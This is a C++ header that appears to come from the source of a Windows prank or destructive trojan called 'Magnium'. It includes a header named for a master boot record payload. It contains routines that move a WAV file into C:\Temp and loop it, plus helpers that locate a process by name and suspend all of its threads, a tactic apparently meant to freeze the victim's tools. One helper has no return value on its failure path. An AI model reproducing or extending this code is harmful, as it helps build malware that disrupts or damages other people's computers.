#pragma once
#include "magnium_mbr.h"
#include <Windows.h>
#include <winternl.h>
#include <math.h>
#include <time.h>
#include <TlHelp32.h>
#include <iostream>

#pragma comment(lib, "winmm.lib") //Don't Forget Connect Library WinMM :D
long unsigned int bufsize = 100;
char buf[100];
void CreateTempDirectory() {
	CreateDirectoryA("C:\\Temp", 0);
}

void CopyAboutUAndDelete() {
	CopyFileA("AboutU.wav", "C:\\Temp\\AboutU.wav", false);
	DeleteFileA("AboutU.wav");
}
void PlayAboutU() {
	PlaySoundW(L"C:\\Temp\\AboutU.wav", 0, SND_FILENAME | SND_ASYNC | SND_LOOP);
}
void SuspendProcessID(DWORD dwProcessID)
{
	HANDLE hThreadSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	THREADENTRY32 threadEntry;
	threadEntry.dwSize = sizeof(THREADENTRY32);
	BOOL bSuspendThreadRes = Thread32First(hThreadSnapshot, &threadEntry);
	while (bSuspendThreadRes)
	{
		if (threadEntry.th32OwnerProcessID == dwProcessID)
		{
			HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, threadEntry.th32ThreadID);
			SuspendThread(hThread);
			CloseHandle(hThread);
		}
		bSuspendThreadRes = Thread32Next(hThreadSnapshot, &threadEntry);
	}
	CloseHandle(hThreadSnapshot);
}
DWORD FindProcessID(LPCWSTR lpProcessName)
{
	HANDLE hProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32W procEntry;
	procEntry.dwSize = sizeof(PROCESSENTRY32W);
	BOOL bSnapProcessRes = Process32FirstW(hProcessSnapshot, &procEntry);
	while (bSnapProcessRes)
	{
		if (!lstrcmpW(procEntry.szExeFile, lpProcessName))
		{
			return procEntry.th32ProcessID;
		}
		bSnapProcessRes = Process32NextW(hProcessSnapshot, &procEntry);
	}
	CloseHandle(hProcessSnapshot);
}